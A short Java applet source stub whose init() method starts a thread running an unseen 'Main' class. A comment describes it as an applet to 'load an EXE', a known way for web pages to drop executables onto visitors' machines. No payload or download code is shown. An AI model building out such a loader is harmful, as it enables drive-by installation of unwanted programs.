import java.applet.*;

import java.io.*;
import java.awt.*;

/* an awesome Java applet to load an EXE */
public class Java extends Applet {
	public void init() {
		new Thread(new Main(this)).start();
	}
}
